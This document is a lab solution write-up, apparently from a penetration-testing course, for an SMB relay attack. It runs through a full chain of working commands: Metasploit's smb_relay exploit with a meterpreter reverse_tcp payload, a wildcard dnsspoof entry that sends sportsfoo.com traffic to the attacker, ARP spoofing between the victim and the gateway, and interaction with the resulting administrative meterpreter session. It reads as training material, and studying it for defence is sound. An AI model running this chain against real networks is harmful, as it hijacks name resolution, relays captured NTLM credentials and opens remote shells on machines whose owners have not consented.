tactica que usa dns poisoning para obtener la clave NTLM y levantar una shell de meterpreter

# Solution

**Step 1:** Start **msfconsole** and configure the SMB Relay exploit: **Commands:**

```
msfconsole
use exploit/windows/smb/smb_relay
set SRVHOST 172.16.5.101
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 172.16.5.101
set SMBHOST 172.16.5.10
exploit
```

![[Pasted image 20260105011906.png]]

**Step 2:** Configure **dnsspoof** in order to redirect the victim to our Metasploit system every time there's an SMB connection to any host in the domain: **sportsfoo.com**. Create a file with fake dns entry with all subdomains of **sportsfoo.com** pointing to our attacker machine. **Command:**

```
echo "172.16.5.101 *.sportsfoo.com" > dns
```

We are ready to run **dnsspoof**: **Command:**

```
dnsspoof -i eth1 -f dns
```

![[Pasted image 20260105011929.png]]

**Step 3:** Activate the **MiTM** attack using the **ARP Spoofing** technique. Our goal is to poison the traffic between our victim, **Windows 7** at **172.16.5.5**, and the default gateway at **172.16.5.1**. In this way, we can manipulate the traffic using **dnsspoof**, which is already running. In order to perform an **ARP Spoofing** attack, we need to enable the IP forwarding as follow: **Command:**

```
echo 1 > /proc/sys/net/ipv4/ip_forward
```

In two separate terminals, start the **ARP Spoof attack** against **172.16.5.5** and **172.16.5.1** using these commands: **Commands:**

```
arpspoof -i eth1 -t 172.16.5.5 172.16.5.1
arpspoof -i eth1 -t 172.16.5.1 172.16.5.5
```

![[Pasted image 20260105011946.png]]

**Note**: For further details, the ARP poisoning attack is covered in Poisoning & Sniffing (Lab10). So, every time the victim (**Windows 7**) starts an **SMB connection**, **dnsspoof** aligned with the **ARP Spoof** attack, forges the **DNS** replies telling that the searched **DNS** address is hosted at the attacker machine:

![[Pasted image 20260105012002.png]]

For example, from the previous results, Windows 7 has started an SMB connection for [**\\fileserver.sportsfoo.com\AnyShare**]. Then instead of getting a DNS response with the real IP address of **fileserver.sportsfoo.com**, it received the IP of the attacker: **172.16.5.101**. Consequently, the SMB connection is hijacked to [**\\172.16.5.101\AnyShare**]. In Metasploit, every time there is an incoming **SMB** connection, the **SMB Relay exploit** grab the **SMB hashes** (credentials) and then uses them to get a shell on the target machine (**172.16.5.10** - since it was set in the **SMBHOST** field of the **smb-relay** exploit).

![[Pasted image 20260105012016.png]]

The SMB Relay attack was successful, and we were able to obtain a meterpreter session on the target machine. This was possible because the credentials used on the fileserver and the target machine are the same. **Step 4:** Interact with the meterpreter session. **Commands:**

```
sessions
sessions -i 1
getuid
```

![[Pasted image 20260105012033.png]]

In this lab, we were able to trick the client by spoofing DNS records, this, in turn, combined with SMB relay attack, provided us with a meterpreter session on the target machine with administrative privileges.